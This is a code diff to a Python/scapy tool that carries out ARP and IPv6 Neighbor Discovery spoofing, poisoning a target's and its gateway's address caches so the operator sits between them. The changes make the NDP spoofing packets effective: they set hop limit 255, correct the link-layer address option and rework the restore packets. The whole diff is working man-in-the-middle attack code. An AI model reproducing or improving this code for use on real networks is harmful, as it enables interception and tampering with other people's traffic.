@@ -28,18 +28,18 @@ ARP = None
 Ether = None
 IPv6 = None
 ICMPv6ND_NA = None
-ICMPv6NDOptSrcLLAddr = None
+ICMPv6NDOptDstLLAddr = None
 
 
 def _ensure_scapy_layers() -> None:
-    global ARP, Ether, IPv6, ICMPv6ND_NA, ICMPv6NDOptSrcLLAddr
+    global ARP, Ether, IPv6, ICMPv6ND_NA, ICMPv6NDOptDstLLAddr
     if (ARP is None or Ether is None or IPv6 is None
-            or ICMPv6ND_NA is None or ICMPv6NDOptSrcLLAddr is None):
+            or ICMPv6ND_NA is None or ICMPv6NDOptDstLLAddr is None):
         from scapy.all import (
             ARP as scapy_ARP,
             Ether as scapy_Ether,
             ICMPv6ND_NA as scapy_ICMPv6ND_NA,
-            ICMPv6NDOptSrcLLAddr as scapy_ICMPv6NDOptSrcLLAddr,
+            ICMPv6NDOptDstLLAddr as scapy_ICMPv6NDOptDstLLAddr,
             IPv6 as scapy_IPv6,
         )
 
@@ -51,8 +51,8 @@ def _ensure_scapy_layers() -> None:
             IPv6 = scapy_IPv6
         if ICMPv6ND_NA is None:
             ICMPv6ND_NA = scapy_ICMPv6ND_NA
-        if ICMPv6NDOptSrcLLAddr is None:
-            ICMPv6NDOptSrcLLAddr = scapy_ICMPv6NDOptSrcLLAddr
+        if ICMPv6NDOptDstLLAddr is None:
+            ICMPv6NDOptDstLLAddr = scapy_ICMPv6NDOptDstLLAddr
 
 
 def validate_spoof_timing(interval: float, burst: int) -> tuple[float, int]:
@@ -155,16 +155,18 @@ class ARPSpoofer:
         self._stop.set()
         for t in self.threads:
             t.join(timeout=3.0)
-        # Send 3 corrective packets to restore real ARP tables
+        # Keep the real peer in the ARP payload while using our own L2 source.
+        # Spoofing the peer as Ether.src makes bridges/switches relearn that
+        # peer on this port and can prevent the opposite repair from arriving.
         for _ in range(3):
             self.packet_backend.send(
-                Ether(dst=self.target_mac, src=self.gateway_mac) /
+                Ether(dst=self.target_mac, src=self.own_mac) /
                 ARP(op=2,
                     pdst=self.target_ip,  psrc=self.gateway_ip,
                     hwdst=self.target_mac, hwsrc=self.gateway_mac),
                 self.interface)
             self.packet_backend.send(
-                Ether(dst=self.gateway_mac, src=self.target_mac) /
+                Ether(dst=self.gateway_mac, src=self.own_mac) /
                 ARP(op=2,
                     pdst=self.gateway_ip,  psrc=self.target_ip,
                     hwdst=self.gateway_mac, hwsrc=self.target_mac),
@@ -206,9 +208,13 @@ class NDPSpoofer:
                 try:
                     pkt = (
                         Ether(dst=self.target_mac, src=self.own_mac) /
-                        IPv6(dst=self.target_ipv6, src=self.router_ipv6) /
+                        IPv6(
+                            dst=self.target_ipv6,
+                            src=self.router_ipv6,
+                            hlim=255,
+                        ) /
                         ICMPv6ND_NA(tgt=self.router_ipv6, R=1, S=1, O=1) /
-                        ICMPv6NDOptSrcLLAddr(lladdr=self.own_mac)
+                        ICMPv6NDOptDstLLAddr(lladdr=self.own_mac)
                     )
                     _send_burst(
                         self.packet_backend, pkt, self.interface, self.burst
@@ -226,9 +232,13 @@ class NDPSpoofer:
                 try:
                     pkt = (
                         Ether(dst=self.router_mac, src=self.own_mac) /
-                        IPv6(dst=self.router_ipv6, src=self.target_ipv6) /
+                        IPv6(
+                            dst=self.router_ipv6,
+                            src=self.target_ipv6,
+                            hlim=255,
+                        ) /
                         ICMPv6ND_NA(tgt=self.target_ipv6, R=0, S=1, O=1) /
-                        ICMPv6NDOptSrcLLAddr(lladdr=self.own_mac)
+                        ICMPv6NDOptDstLLAddr(lladdr=self.own_mac)
                     )
                     _send_burst(
                         self.packet_backend, pkt, self.interface, self.burst
@@ -255,18 +265,28 @@ class NDPSpoofer:
         self._stop.set()
         for t in self.threads:
             t.join(timeout=3.0)
+        # Advertise the real peer in the ND option without teaching the
+        # intervening L2 network that the peer moved onto our interface.
         for _ in range(3):
             self.packet_backend.send(
-                Ether(dst=self.target_mac, src=self.router_mac) /
-                IPv6(dst=self.target_ipv6, src=self.router_ipv6) /
+                Ether(dst=self.target_mac, src=self.own_mac) /
+                IPv6(
+                    dst=self.target_ipv6,
+                    src=self.router_ipv6,
+                    hlim=255,
+                ) /
                 ICMPv6ND_NA(tgt=self.router_ipv6, R=1, S=1, O=1) /
-                ICMPv6NDOptSrcLLAddr(lladdr=self.router_mac),
+                ICMPv6NDOptDstLLAddr(lladdr=self.router_mac),
                 self.interface)
             self.packet_backend.send(
-                Ether(dst=self.router_mac, src=self.target_mac) /
-                IPv6(dst=self.router_ipv6, src=self.target_ipv6) /
+                Ether(dst=self.router_mac, src=self.own_mac) /
+                IPv6(
+                    dst=self.router_ipv6,
+                    src=self.target_ipv6,
+                    hlim=255,
+                ) /
                 ICMPv6ND_NA(tgt=self.target_ipv6, R=0, S=1, O=1) /
-                ICMPv6NDOptSrcLLAddr(lladdr=self.target_mac),
+                ICMPv6NDOptDstLLAddr(lladdr=self.target_mac),
                 self.interface)
             time.sleep(0.3)
         log.info("NDP tables restored")
